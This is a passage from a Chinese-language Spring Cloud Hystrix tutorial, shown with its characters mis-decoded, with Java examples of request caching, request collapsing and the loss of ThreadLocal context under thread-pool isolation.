ä¼šæŠ¥ä¸€ä¸ªæ²¡æœ‰åˆå§‹åŒ–ä¸Šä¸‹æ–‡çš„å¼‚å¸¸ï¼›å¯ä»¥ä½¿ç”¨ filter è¿‡æ»¤å™¨æˆ–è€… Interceptor æ‹¦æˆªå™¨è¿›è¡Œåˆå§‹åŒ–ï¼Œä¸‹é¢å°†ä½¿ç”¨ä¸€ä¸ªæ‹¦æˆªå™¨æ¥ä¸¾ä¾‹ã€‚ä½¿ç”¨ç±»çš„æ–¹å¼å¾ˆç®€å•ï¼Œåªéœ€è¦ç»§æ‰¿ HystrixCommandï¼Œç„¶åé‡å†™å®ƒçš„ getCacheKey æ–¹æ³•å³å¯ï¼Œä¿è¯å¯¹äºåŒä¸€ä¸ªè¯·æ±‚è¿”å›åŒæ ·çš„é”®å€¼ï¼›å¯¹äºç¼“å­˜çš„æ¸…é™¤ï¼Œåˆ™å¯ä»¥è°ƒç”¨ HystrixRequestCache ç±»çš„ clean æ–¹æ³•å³å¯ã€‚ æ‹¦æˆªå™¨ç±»ï¼š 1234567891011121314151617181920public class CacheContextInterceptor implements HandlerInterceptor { private HystrixRequestContext context; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { this.context = HystrixRequestContext.initializeContext(); return true; } @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception { } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { this.context.shutdown(); }} åˆ›å»ºé…ç½®ç±»ï¼Œç”¨äºæ³¨å†Œæ‹¦æˆªå™¨ï¼š 1234567891011121314@Configurationpublic class CommonConfiguration { @Bean @LoadBalanced public RestTemplate restTemplate() { return new RestTemplate(); } @Bean public CacheContextInterceptor userContextInterceptor() { return new CacheContextInterceptor(); }} 1234567891011@Configurationpublic class WebMvcConfiguration extends WebMvcConfigurerAdapter { @Autowired CacheContextInterceptor userContextInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(userContextInterceptor); }} ç»§æ‰¿ HystrixCommand ç±»ï¼š 12345678910111213141516171819202122232425262728293031323334public class UserCommand extends HystrixCommand&lt;String&gt; { private String userName; private RestTemplate restTemplate; private static final Logger logger = LoggerFactory.getLogger(UserCommand.class); private static final HystrixCommandKey KEY = HystrixCommandKey.Factory.asKey("CommandKey"); public UserCommand(String userName, RestTemplate restTemplate) { super(Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey("CacheGroup")).andCommandKey(KEY)); this.userName = userName; this.restTemplate = restTemplate; } @Override protected String run() throws Exception { String result = restTemplate.getForObject("http://PROVIDER/user/getUser?userName={1}", String.class, this.userName); logger.info(result); return result; } @Override protected String getFallback() { return super.getFallback(); } @Override protected String getCacheKey() { return this.userName; } public static void cleanCache(String userName) { HystrixRequestCache.getInstance(KEY, HystrixConcurrencyStrategyDefault.getInstance()).clear(userName); }} ç”¨äºæµ‹è¯•çš„ Controller ç±»ï¼š 123456789101112131415161718192021@RestController@RequestMapping("/user")public class UserController { private static final Logger logger = LoggerFactory.getLogger(UserController.class); @Autowired private RestTemplate restTemplate; @GetMapping("/get") public String get(String userName) { UserCommand commandOne = new UserCommand(userName, restTemplate); commandOne.execute(); logger.info("from cache: " + commandOne.isResponseFromCache()); UserCommand commandTwo = new UserCommand(userName, restTemplate); commandTwo.execute(); logger.info("from cache: " + commandTwo.isResponseFromCache()); return "cache test finished"; }} å¯åŠ¨ä¸»ç±»ï¼š 123456789@EnableHystrix@EnableDiscoveryClient@SpringBootApplicationpublic class CacheApplication { public static void main(String[] args) { SpringApplication.run(CacheApplication.class, args); }} è®¿é—® http://127.0.0.1:8082/user/get?userName=Tomï¼Œè°ƒç”¨äº†ä¸¤æ¬¡ execute æ–¹æ³•ï¼Œä½¿ç”¨ Hystrix çš„é»˜è®¤æ–¹æ³• isResponseFromCache æ¥åˆ¤æ–­è¯·æ±‚ç»“æœæ˜¯å¦æ¥è‡ªäºç¼“å­˜ï¼Œä»ä»¥ä¸‹è¾“å‡ºå¯ä»¥çœ‹å‡ºç¬¬äºŒæ¬¡è¯·æ±‚ç¡®å®æ¥è‡ªäºç¼“å­˜ï¼Œæ­¤æ—¶è¯´æ˜ Hystrix çš„ç¼“å­˜ç”Ÿæ•ˆäº†ã€‚ 12c.s.study.controller.CacheController : from cache: falsec.s.study.controller.CacheController : from cache: true ä½¿ç”¨æ³¨è§£å¼€å¯ç¼“å­˜Hystrix æä¾›äº†æ³¨è§£æ¥ä½¿ç”¨ç¼“å­˜æœºåˆ¶ï¼Œä¸”æ›´ä¸ºæ–¹ä¾¿å’Œå¿«æ·ï¼Œä½¿ç”¨ @CacheResult å’Œ @CacheRemove å³å¯ç¼“å­˜æ•°æ®å’Œæ¸…é™¤ç¼“å­˜ã€‚ ä½¿ç”¨æ³¨è§£ç¼“å­˜æ•°æ®ï¼š 12345678910111213141516@Servicepublic class DeptService { private static final Logger logger = LoggerFactory.getLogger(DeptService.class); @Autowired private RestTemplate restTemplate; @CacheResult @HystrixCommand public String getDept(String deptName) { String result = restTemplate.getForObject("http://PROVIDER/dept/getDept?deptName={1}", String.class, deptName); logger.info(result); return result; }} ç”¨äºæµ‹è¯•çš„ Controller ç±»ï¼š 1234567891011121314@RestController@RequestMapping("/dept")public class DeptController { @Autowired private DeptService deptService; @GetMapping("/get") public String get(String deptName) { deptService.getDept("IT"); deptService.getDept("IT"); return "annotation cache test finished"; }} è®¿é—® http://127.0.0.1:8082/dept/get?deptName=ITï¼Œè°ƒç”¨äº†ä¸¤æ¬¡ get æ–¹æ³•ï¼Œå‘ç°åªæ‰“å°äº†ä¸€æ¡æ•°æ®ï¼Œè¯´æ˜ç¬¬äºŒæ¬¡çš„è¯·æ±‚æ˜¯ä»ç¼“å­˜ä¸­è¯»å–ï¼Œå³ Hystrix çš„ç¼“å­˜ç”Ÿæ•ˆäº†ã€‚ ä½¿ç”¨æ³¨è§£æ¸…é™¤ç¼“å­˜ä½¿ç”¨ commandKey å‚æ•°æ¥æŒ‡å®š HystrixCommand çš„ keyï¼Œåœ¨æ¸…é™¤ç¼“å­˜æ—¶ï¼Œå¯ä»¥ç›´æ¥é™„åŠ è¿™ä¸ªå€¼æ¥æ¸…é™¤æŒ‡å®šçš„å‚æ•°ï¼š 1234567891011121314151617181920212223@Servicepublic class DeptService { private static final Logger logger = LoggerFactory.getLogger(DeptService.class); @Autowired private RestTemplate restTemplate; @CacheResult @HystrixCommand(commandKey = "findDept") public String findDept(@CacheKey String deptName) { String result = restTemplate.getForObject("http://PROVIDER/dept/getDept?deptName={1}", String.class, deptName); logger.info(result); return result; } @CacheRemove(commandKey = "findDept") @HystrixCommand public String updateDept(@CacheKey String deptName) { logger.info("delete dept cache"); return "update dept success"; }} ç”¨äºæµ‹è¯•çš„ Controller ç±»ï¼š 1234567891011121314151617181920@RestController@RequestMapping("/dept")public class DeptController { @Autowired private DeptService deptService; @GetMapping("/find") public String find(String deptName) { // è°ƒç”¨æ¥å£å¹¶ç¼“å­˜æ•°æ® deptService.findDept("IT"); deptService.findDept("IT"); // æ¸…é™¤ç¼“å­˜ deptService.updateDept(deptName); // å†è°ƒç”¨æ¥å£ deptService.findDept("IT"); deptService.findDept("IT"); return "annotation cache test finished"; }} è®¿é—® http://127.0.0.1:8082/dept/find?deptName=ITï¼Œè¿è¡Œç»“æœå¦‚ä¸‹ï¼›åœ¨æ²¡æœ‰ç¼“å­˜çš„æƒ…å†µä¸‹ï¼Œæ‰“å°äº†ä¸€æ¬¡ï¼Œç¬¬äºŒæ¬¡å–çš„æ˜¯ç¼“å­˜æ•°æ®ï¼Œç„¶åæ¸…é™¤ç¼“å­˜ååˆæ‰“å°äº†ä¸€æ¬¡ï¼Œæœ€åä¸€æ¬¡åˆä»ç¼“å­˜é‡Œå–æ•°æ®ï¼š 123DeptService : {"id":1,"deptName":"IT"}DeptService : delete dept cacheDeptService : {"id":1,"deptName":"IT"} ç¼“å­˜ä½¿ç”¨æ³¨æ„äº‹é¡¹Hystrix å¸¸ç”¨ç¼“å­˜æ³¨è§£ï¼š @CacheResultï¼šä½¿ç”¨è¯¥æ³¨è§£åç»“æœä¼šè¢«ç¼“å­˜ï¼ŒåŒæ—¶å®ƒéœ€è¦å’Œ @HystrixCommand æ³¨è§£ä¸€èµ·ä½¿ç”¨ï¼Œæ³¨è§£å‚æ•°ä¸º cacheKeyMethod @CacheRemoveï¼šæ¸…é™¤ç¼“å­˜ï¼Œéœ€è¦æŒ‡å®š commandKeyï¼Œæ³¨è§£å‚æ•°ä¸º commandKeyã€cacheKeyMethod @CacheKeyï¼šæŒ‡å®šè¯·æ±‚å‘½ä»¤å‚æ•°ï¼Œé»˜è®¤ä½¿ç”¨æ–¹æ³•é‡Œçš„æ‰€æœ‰å‚æ•°ä½œä¸º Keyï¼Œæ³¨è§£å‚æ•°ä¸º value ä¸€èˆ¬åœ¨æŸ¥è¯¢æ¥å£ä¸Šä½¿ç”¨ @CacheResultï¼Œåœ¨æ›´æ–°ã€åˆ é™¤æ¥å£ä¸Šä½¿ç”¨ @CacheRemove åˆ é™¤ç¼“å­˜ ä½¿ç”¨ Hystrix ç¼“å­˜æ—¶æœ‰å‡ æ–¹é¢éœ€è¦æ³¨æ„ï¼š éœ€è¦ä½¿ç”¨ @EnableHystrix æ³¨è§£å¯ç”¨ Hystrix éœ€è¦åˆå§‹åŒ– HystrixRequestContextï¼Œæ— è®ºæ˜¯ä½¿ç”¨ç»§æ‰¿ç±»è¿˜æ˜¯æ³¨è§£çš„æ–¹å¼æ¥å¼€å¯ç¼“å­˜ åœ¨æŒ‡å®šäº† HystrixCommand çš„ commandKey åï¼Œåœ¨ @CacheRemove ä¹Ÿè¦æŒ‡å®š commandKey Hystrix Request CollapserRequest Collapser ä»‹ç»Request Collapser æ˜¯ Hystrix æ¨å‡ºçš„é’ˆå¯¹å¤šä¸ªè¯·æ±‚è°ƒç”¨å•ä¸ªåç«¯ä¾èµ–åšçš„ä¸€ç§ä¼˜åŒ–å’ŒèŠ‚çº¦ç½‘ç»œå¼€é”€çš„æ–¹æ³•ã€‚å¼•ç”¨å®˜æ–¹çš„è¿™å¼ å›¾ï¼Œå½“å‘èµ· 5 ä¸ªè¯·æ±‚æ—¶ï¼Œåœ¨è¯·æ±‚æ²¡æœ‰èšåˆå’Œåˆå¹¶çš„æƒ…å†µä¸‹ï¼Œæ˜¯æ¯ä¸ªè¯·æ±‚å•ç‹¬å¼€å¯ä¸€ä¸ªçº¿ç¨‹ï¼Œå¹¶å¼€å¯ä¸€ä¸ªç½‘ç»œé“¾æ¥è¿›è¡Œè°ƒç”¨ï¼Œè¿™éƒ½ä¼šåŠ é‡åº”ç”¨ç¨‹åºçš„è´Ÿæ‹…å’Œå¼€é”€ï¼Œå¹¶å ç”¨ Hystrix çš„çº¿ç¨‹è¿æ¥æ± ã€‚å½“ä½¿ç”¨ Collapser æŠŠè¯·æ±‚éƒ½åˆå¹¶èµ·æ¥æ—¶ï¼Œåˆ™åªéœ€è¦ä¸€ä¸ªçº¿ç¨‹å’Œä¸€ä¸ªè¿æ¥çš„å¼€é”€ï¼Œè¿™å¤§å¤§å‡å°‘äº†å¹¶å‘å’Œè¯·æ±‚æ‰§è¡Œæ‰€éœ€è¦çš„çº¿ç¨‹æ•°å’Œç½‘ç»œè¿æ¥æ•°ï¼Œå°¤å…¶åœ¨ä¸€ä¸ªæ—¶é—´æ®µå†…æœ‰éå¸¸å¤šè¯·æ±‚çš„æƒ…å†µä¸‹èƒ½æå¤§åœ°æé«˜èµ„æºåˆ©ç”¨ç‡ã€‚ç‰¹åˆ«æ³¨æ„ï¼šè‹¥ä½¿ç”¨ Feign è°ƒç”¨çš„è¯ï¼Œç›®å‰è¿˜ä¸æ”¯æŒ Collapserã€‚å…·ä½“ä½¿ç”¨ä¾‹å­å¦‚ä¸‹ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ ä½¿ç”¨æ³¨è§£è¿›è¡Œè¯·æ±‚åˆå¹¶ä½¿ç”¨ Request Collapser ä¹Ÿå¯ä»¥é€šè¿‡ç»§æ‰¿ç±»å’Œæ³¨è§£çš„å½¢å¼æ¥å®ç°ï¼Œä¸‹é¢ä¸»è¦ä»‹ç»æ³¨è§£çš„ä½¿ç”¨æ–¹å¼ã€‚ Request Collapser å’Œ Hystrix ç¼“å­˜çš„ä½¿ç”¨ç±»ä¼¼ï¼Œéœ€è¦å®ç° Hystrix ä¸Šä¸‹æ–‡çš„åˆå§‹åŒ–å’Œå…³é—­ï¼Œè¿™é‡Œä½¿ç”¨æ‹¦æˆªå™¨æ¥å®ç°ï¼š 1234567891011121314151617181920public class HystrixContextInterceptor implements HandlerInterceptor { private HystrixRequestContext context; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { this.context = HystrixRequestContext.initializeContext(); return true; } @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception { } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { this.context.shutdown(); }} åˆ›å»ºé…ç½®ç±»ï¼Œç”¨äºæ³¨å†Œæ‹¦æˆªå™¨ï¼š 1234567891011121314@Configurationpublic class CommonConfiguration { @Bean @LoadBalanced public RestTemplate restTemplate() { return new RestTemplate(); } @Bean public CacheContextInterceptor userContextInterceptor() { return new CacheContextInterceptor(); }} 1234567891011@Configurationpublic class WebMvcConfiguration extends WebMvcConfigurerAdapter { @Autowired CacheContextInterceptor userContextInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(userContextInterceptor); }} å®ç°ä¸€ä¸ª Future å¼‚æ­¥è¿”å›å€¼çš„æ–¹æ³•ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•ä¸Šé…ç½®è¯·æ±‚åˆå¹¶çš„æ³¨è§£ï¼Œä¹‹åå¤–éƒ¨é€šè¿‡è°ƒç”¨è¿™ä¸ªæ–¹æ³•æ¥å®ç°è¯·æ±‚çš„åˆå¹¶ã€‚æ³¨æ„ï¼šè¿™ä¸ªæ–¹æ³•å¿…é¡»æ˜¯ Future å¼‚æ­¥è¿”å›å€¼çš„ï¼Œå¦åˆ™æ— æ³•åˆå¹¶è¯·æ±‚ã€‚å…¶ä¸­ @HystrixCollapser æ³¨è§£ä»£è¡¨å¼€å¯è¯·æ±‚åˆå¹¶ï¼Œè°ƒç”¨è¯¥æ–¹æ³•æ—¶ï¼Œå®é™…ä¸Šè¿è¡Œçš„æ˜¯ collapsingList æ–¹æ³•ï¼Œä¸”åˆ©ç”¨ HystrixProperty æŒ‡å®š timerDelayInMillisecondsï¼Œè¿™å±æ€§ä»£è¡¨åˆå¹¶å¤šå°‘æ¯«ç§’ï¼ˆmsï¼‰å†…çš„è¯·æ±‚ï¼Œå¦‚æœä¸é…ç½®çš„è¯ï¼Œé»˜è®¤æ˜¯ 10msã€‚ 1234567891011121314151617181920212223242526@Servicepublic class CollapsingService implements ICollapsingService { private static final Logger logger = LoggerFactory.getLogger(CollapsingService.class); @HystrixCollapser(batchMethod = "collapsingList", collapserProperties = { @HystrixProperty(name = "timerDelayInMilliseconds", value = "1000") }) public Future&lt;User&gt; collapsing(Integer id) { return null; } @HystrixCommand public List&lt;User&gt; collapsingList(List&lt;Integer&gt; userParam) { logger.info("collapsingListå½“å‰çº¿ç¨‹: " + Thread.currentThread().getName()); logger.info("å½“å‰è¯·æ±‚å‚æ•°ä¸ªæ•°:" + userParam.size()); List&lt;User&gt; userList = new ArrayList&lt;User&gt;(); for (Integer userNumber : userParam) { User user = new User(); user.setUserName("User - " + userNumber); user.setAge(userNumber); userList.add(user); } return userList; }} åˆ›å»ºæ¥å£æµ‹è¯•ç±»ï¼Œåœ¨ getUser æ¥å£å†…è¿ç»­è°ƒç”¨ä¸¤æ¬¡ collapsing æ–¹æ³•ï¼š 123456789101112131415161718192021222324@RestController@RequestMapping("/user")public class CollapsingController { private static final Logger logger = LoggerFactory.getLogger(CollapsingController.class); @Autowired private ICollapsingService collapsingService; /** * è¯·æ±‚èšåˆ/åˆå¹¶ * * @return * @throws Exception */ @RequestMapping("/getUser") public String getUser() throws Exception { Future&lt;User&gt; user = collapsingService.collapsing(1); Future&lt;User&gt; user2 = collapsingService.collapsing(2); logger.info(user.get().getUserName()); logger.info(user2.get().getUserName()); return "Success"; }} å¯åŠ¨ä¸»ç±»ï¼š 123456789@EnableHystrix@EnableDiscoveryClient@SpringBootApplicationpublic class CollapsingApplication { public static void main(String[] args) { SpringApplication.run(CollapsingApplication.class, args);} å¯åŠ¨åº”ç”¨åè®¿é—® http://127.0.0.1:8082/user/getUserï¼Œå¯ä»¥çœ‹åˆ°å®é™…è°ƒç”¨äº† collapsingList æ–¹æ³•ï¼Œå¹¶æ‰“å°äº†å½“å‰çº¿ç¨‹çš„åç§°ã€è¯·æ±‚çš„å‚æ•°å’Œè¿è¡Œç»“æœï¼Œä¸€å…±åˆå¹¶äº†ä¸¤ä¸ªè¯·æ±‚ï¼Œè¾¾åˆ°äº†é¢„æœŸæ•ˆæœï¼š 1234CollapsingService : collapsingListå½“å‰çº¿ç¨‹: hystrix-CollapsingService-1CollapsingService : å½“å‰è¯·æ±‚å‚æ•°ä¸ªæ•°:2CollapsingController : User - 1CollapsingController : User - 2 ä½¿ç”¨æ³¨è§£è¿›è¡Œè¯·æ±‚åˆå¹¶ï¼ˆå…¨å±€ï¼‰ä¸Šé¢è®²äº†å¤šä¸ªè¯·æ±‚æ˜¯å¦‚ä½•åˆå¹¶çš„ï¼Œä½†æ˜¯éƒ½æ˜¯åœ¨åŒä¸€è¯·æ±‚ï¼ˆå•ä¸€çº¿ç¨‹ï¼‰ä¸­å‘èµ·çš„è°ƒç”¨ï¼Œå¦‚æœä¸¤æ¬¡è¯·æ±‚æ¥å£éƒ½æ˜¯åœ¨ä¸åŒçº¿ç¨‹è¿è¡Œçš„ï¼Œé‚£ä¹ˆå¦‚ä½•åˆå¹¶æ•´ä¸ªåº”ç”¨ä¸­çš„è¯·æ±‚å‘¢ï¼Ÿå³å¦‚ä½•å¯¹æ‰€æœ‰çº¿ç¨‹è¯·æ±‚ä¸­çš„å¤šæ¬¡æœåŠ¡è°ƒç”¨è¿›è¡Œåˆå¹¶å‘¢ï¼Ÿ @HystrixCollapser æ³¨è§£çš„ scope å±æ€§æœ‰ä¸ªä¸¤ä¸ªå€¼ï¼Œåˆ†åˆ«æ˜¯ï¼šRequestï¼ˆé»˜è®¤å€¼ï¼‰ã€Globalã€‚ä¸‹é¢çš„ä»£ç ä¸­ï¼Œå¢åŠ äº†ä¸€ä¸ª scope å±æ€§ä¸º Global çš„æ–¹æ³•ï¼š 1234567891011121314151617181920212223242526@Servicepublic class CollapsingService implements ICollapsingService { private static final Logger logger = LoggerFactory.getLogger(CollapsingService.class); @HystrixCollapser(batchMethod = "collapsingListGlobal", scope = Scope.GLOBAL, collapserProperties = { @HystrixProperty(name = "timerDelayInMilliseconds", value = "10000") }) public Future&lt;User&gt; collapsingGlobal(Integer id) { return null; } @HystrixCommand public List&lt;User&gt; collapsingListGlobal(List&lt;Integer&gt; userParam) { logger.info("collapsingListGlobalå½“å‰çº¿ç¨‹: " + Thread.currentThread().getName()); logger.info("å½“å‰è¯·æ±‚å‚æ•°ä¸ªæ•°:" + userParam.size()); List&lt;User&gt; userList = new ArrayList&lt;User&gt;(); for (Integer userNumber : userParam) { User user = new User(); user.setUserName("User- " + userNumber); user.setAge(userNumber); userList.add(user); } return userList; }} å¢åŠ ä¸€ä¸ªè°ƒç”¨æ¥å£æ¥è°ƒç”¨ä¸Šè¿°æ–¹æ³•ï¼š 123456789101112131415161718192021222324@RestController@RequestMapping("/user")public class CollapsingController { private static final Logger logger = LoggerFactory.getLogger(CollapsingController.class); @Autowired private ICollapsingService collapsingService; /** * è¯·æ±‚èšåˆ/åˆå¹¶,æ•´ä¸ªåº”ç”¨çš„ * * @return * @throws Exception */ @RequestMapping("/getUserGolbal") public String getUserGolbal() throws Exception { Future&lt;User&gt; user = collapsingService.collapsingGlobal(1); Future&lt;User&gt; user2 = collapsingService.collapsingGlobal(2); logger.info(user.get().getUserName()); logger.info(user2.get().getUserName()); return "Success"; }} è¿ç»­è®¿é—® http://127.0.0.1:8082/user/getUserGolbal ä¸¤æ¬¡ï¼Œä¼šå‘ç°æ‰€æœ‰è¯·æ±‚éƒ½åˆå¹¶åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­ï¼›è‹¥æ”¹ä¸º Request ä½œç”¨åŸŸï¼ŒHystrix åˆ™ä¼šè¿è¡Œä¸¤ä¸ªçº¿ç¨‹æ¥åˆ†åˆ«å¤„ç†ä¸¤æ¬¡è¯·æ±‚ã€‚ 123456CollapsingService : collapsingListGlobalå½“å‰çº¿ç¨‹: hystrix-CollapsingService-10CollapsingService : å½“å‰è¯·æ±‚å‚æ•°ä¸ªæ•°:4CollapsingController : User- 1CollapsingController : User- 1CollapsingController : User- 2CollapsingController : User- 2 è¯·æ±‚åˆå¹¶æ€»ç»“Hystrix Request Collapser ä¸»è¦ç”¨äºè¯·æ±‚åˆå¹¶çš„åœºæ™¯ï¼Œåœ¨ä¸€ä¸ªç®€å•çš„ç³»ç»Ÿä¸­ï¼Œè¿™ç§åœºæ™¯å¯èƒ½å¾ˆå°‘ç¢°åˆ°ï¼Œæ‰€ä»¥å¯¹äºè¯·æ±‚åˆå¹¶ï¼Œä¸€èˆ¬çš„ä½¿ç”¨åœºæ™¯æ˜¯ï¼šå½“åœ¨æŸä¸ªæ—¶é—´æ®µå†…æœ‰å¤§é‡æˆ–å¹¶å‘çš„ç›¸åŒè¯·æ±‚æ—¶ï¼Œåˆ™é€‚ç”¨ä½¿ç”¨è¯·æ±‚åˆå¹¶ï¼›è€Œå¦‚æœåœ¨æŸä¸ªæ—¶é—´æ®µå†…åªæœ‰å¾ˆå°‘çš„è¯·æ±‚ï¼Œä¸”å»¶è¿Ÿä¹Ÿä¸é«˜ï¼Œæ­¤æ—¶ä½¿ç”¨è¯·æ±‚åˆå¹¶åè€Œä¼šå¢åŠ å¤æ‚åº¦å’Œå»¶è¿Ÿï¼Œå› ä¸ºå¯¹äº Collapser æœ¬èº«ï¼ŒHystrix ä¹Ÿæ˜¯éœ€è¦æ—¶é—´è¿›è¡Œæ‰¹å¤„ç†çš„ã€‚ Hystrix çº¿ç¨‹ä¼ é€’åŠå¹¶å‘ç­–ç•¥Hystrix çº¿ç¨‹ä¼ é€’ä»‹ç»Hystrix ä¼šå¯¹è¯·æ±‚è¿›è¡Œå°è£…ï¼Œç„¶åç®¡ç†è¯·æ±‚çš„è°ƒç”¨ï¼Œä»è€Œå®ç°æ–­è·¯å™¨ç­‰å¤šç§åŠŸèƒ½ã€‚Hystrix æä¾›äº†ä¸¤ç§éš”ç¦»æ¨¡å¼æ¥è¿›è¡Œè¯·æ±‚çš„æ“ä½œï¼Œä¸€ç§æ˜¯ä¿¡å·é‡éš”ç¦»ï¼Œä¸€ç§æ˜¯çº¿ç¨‹æ± éš”ç¦»ã€‚å¦‚æœæ˜¯ä¿¡å·é‡ï¼ŒHystrix åˆ™åœ¨è¯·æ±‚çš„æ—¶å€™ä¼šè·å–åˆ°ä¸€ä¸ªä¿¡å·é‡ï¼Œå¦‚æœæˆåŠŸæ‹¿åˆ°ï¼Œåˆ™ç»§ç»­è¿›è¡Œè¯·æ±‚ï¼Œè¯·æ±‚åœ¨åŒä¸€ä¸ªçº¿ç¨‹ä¸­æ‰§è¡Œå®Œæ¯•ã€‚å¦‚æœæ˜¯çº¿ç¨‹æ± éš”ç¦»ï¼ŒHystrix ä¼šæŠŠè¯·æ±‚æ”¾å…¥çº¿ç¨‹æ± ä¸­æ‰§è¡Œï¼Œè¿™æ—¶å°±æœ‰å¯èƒ½äº§ç”Ÿçº¿ç¨‹çš„å˜åŒ–ï¼Œä»è€Œå¯¼è‡´çº¿ç¨‹ 1 çš„ä¸Šä¸‹æ–‡æ•°æ®åœ¨çº¿ç¨‹ 2 é‡Œä¸èƒ½æ­£å¸¸æ‹¿åˆ°ã€‚ä¸‹é¢é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥è¯´æ˜ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ Hystrix çº¿ç¨‹ä¼ é€’é—®é¢˜é‡ç°å»ºç«‹ä¸€ä¸ª ThreadLocal æ¥ä¿å­˜ç”¨æˆ·çš„ä¿¡æ¯ï¼Œé€šå¸¸åœ¨å¾®æœåŠ¡é‡Œï¼Œä¼šæŠŠå½“å‰è¯·æ±‚çš„ä¸Šä¸‹æ–‡æ•°æ®æ”¾å…¥æœ¬åœ°çº¿ç¨‹å˜é‡ï¼Œä¾¿äºåç»­ä½¿ç”¨å’Œé”€æ¯ï¼š 1234public class HystrixThreadLocal { public static ThreadLocal&lt;String&gt; threadLocal = new ThreadLocal&lt;&gt;();} å®šä¹‰æµ‹è¯•æ¥å£ï¼Œæ‰“å°å½“å‰çº¿ç¨‹çš„ IDï¼Œå¹¶åˆ©ç”¨ ThreadLocal å­˜æ”¾ç”¨æˆ·ä¿¡æ¯ï¼›ä¸ºäº†å…¼å®¹å…¶ä»–æƒ…å†µï¼Œä¾‹å¦‚åœ¨ä½¿ç”¨ Feign è°ƒç”¨çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šä½¿ç”¨ RequestContextHolder æ‹¿åˆ°ä¸Šä¸‹æ–‡å±æ€§ï¼Œåœ¨æ­¤ä¹Ÿè¿›è¡Œæµ‹è¯•ä¸€ä¸‹ï¼š 12345678910111213141516171819@RestController@RequestMapping("/user")public class UserController { private static final Logger logger = LoggerFactory.getLogger(UserController.class); @Autowired private UserService userService; @GetMapping("/get/{id}") public String get(@PathVariable("id") Integer id) { HystrixThreadLocal.threadLocal.set("userId: " + id); RequestContextHolder.currentRequestAttributes().setAttribute("userId", "userId: " + id, RequestAttributes.SCOPE_REQUEST); logger.info("current thread: " + Thread.currentThread().getId()); logger.info("thread local: " + HystrixThreadLocal.threadLocal.get()); logger.info("RequestContextHolder: " + RequestContextHolder.currentRequestAttributes().getAttribute("userId", RequestAttributes.SCOPE_REQUEST)); return userService.get(id); }} å®šä¹‰æœåŠ¡ç±»ï¼Œæµ‹è¯•åœ¨æ²¡æœ‰ä½¿ç”¨çº¿ç¨‹æ± éš”ç¦»æ¨¡å¼çš„æƒ…å†µä¸‹ï¼Œè·å–ç”¨æˆ·ä¿¡æ¯ï¼š 123456789101112@Servicepublic class UserService { private static final Logger logger = LoggerFactory.getLogger(UserService.class); public String get(Integer id) { logger.info("current thread: " + Thread.currentThread().getId()); logger.info("thread local: " + HystrixThreadLocal.threadLocal.get()); logger.info("RequestContextHolder: " + RequestContextHolder.currentRequestAttributes().getAttribute("userId", RequestAttributes.SCOPE_REQUEST).toString()); return "Success"; }} å¯åŠ¨åº”ç”¨åè®¿é—® http://127.0.0.1:8082/user/get/2 åï¼Œå¯ä»¥çœ‹åˆ°æ‰“å°çš„çº¿ç¨‹ ID éƒ½æ˜¯ä¸€æ ·çš„ï¼Œçº¿ç¨‹å˜é‡ä¹Ÿæ˜¯ä¼ å…¥ 2ï¼Œè¯·æ±‚ä¸Šä¸‹æ–‡çš„æŒæœ‰å¯¹è±¡ä¹Ÿå¯ä»¥é¡ºåˆ©æ‹¿åˆ°ï¼š 1234567UserController : current thread: 59UserController : thread local: userId: 2UserController : RequestContextHolder: userId: 2UserService : current thread: 59UserService : thread local: userId: 2UserService : RequestContextHolder: userId: 2 æœåŠ¡ç±»æ·»åŠ  @HystrixCommand æ³¨è§£ï¼Œæµ‹è¯•åœ¨ä½¿ç”¨çº¿ç¨‹æ± éš”ç¦»æ¨¡å¼çš„æƒ…å†µä¸‹ï¼Œè·å–ç”¨æˆ·ä¿¡æ¯ï¼š 12345678910111213@Servicepublic class UserService { private static final Logger logger = LoggerFactory.getLogger(UserService.class); @HystrixCommand public String get(Integer id) { logger.info("current thread: " + Thread.currentThread().getId()); logger.info("thread local: " + HystrixThreadLocal.threadLocal.get()); logger.info("RequestContextHolder: " + RequestContextHolder.currentRequestAttributes().getAttribute("userId", RequestAttributes.SCOPE_REQUEST).toString()); return "Success"; }} å¯åŠ¨åº”ç”¨åè®¿é—® http://127.0.0.1:8082/user/get/2 åï¼Œä¼šå‘ç°è¿›å…¥çš„çº¿ç¨‹æ±  ID æ˜¯ 57ï¼Œå½“è¾¾åˆ°åå°æœåŠ¡çš„æ—¶å€™ï¼Œçº¿ç¨‹ ID å˜æˆ 82ï¼Œè¯´æ˜çº¿ç¨‹æ± çš„éš”ç¦»å·²ç»ç”Ÿæ•ˆï¼Œæ˜¯é‡æ–°å¯åŠ¨çš„çº¿ç¨‹å¤„ç†è¯·æ±‚çš„ï¼Œç„¶åçº¿ç¨‹çš„å˜é‡ä¹Ÿä¸¢å¤±äº†ï¼ŒRequestContextHolder ä¸­ä¹ŸæŠ›å‡ºäº†å¼‚å¸¸ï¼Œæ„æ€æ˜¯æ²¡æœ‰ç»‘å®šçº¿ç¨‹å˜é‡ï¼Œè‡³æ­¤æˆåŠŸåœ°é‡ç°äº†çˆ¶å­çº¿ç¨‹æ•°æ®ä¼ é€’çš„é—®é¢˜ã€‚ 1234567UserController : current thread: 57UserController : thread local: userId: 2UserController : RequestContextHolder: userId: 2UserService : current thread: 82UserService : thread local: nulljava.lang.IllegalStateException: No thread-bound request found: Hystrix çº¿ç¨‹ä¼ é€’é—®é¢˜è§£å†³æ–¹æ¡ˆè§£å†³ Hystrix 